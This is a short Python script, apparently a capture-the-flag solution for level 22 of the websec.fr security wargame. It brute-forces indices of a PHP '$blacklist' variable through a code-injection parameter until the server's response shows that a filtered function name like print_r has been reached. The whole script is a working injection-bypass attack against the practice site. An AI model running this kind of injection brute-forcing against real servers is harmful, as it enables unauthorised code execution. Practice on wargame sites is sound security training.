import requests
i=0

page="http://websec.fr/level22/index.php?code=$blacklist{"+str(i)+"}"

markup = requests.get(page)
print (markup.text)
code="print_r</pre>"
for i in range (1123):
    page="http://websec.fr/level22/index.php?code=$blacklist{"+str(i)+"}"
    print(page)
    markup = (requests.get(page)).text
    if code in markup:
        print("[<->]success"+str(i))
        break
    else:
        print ("[*] Trying..."+str(i))





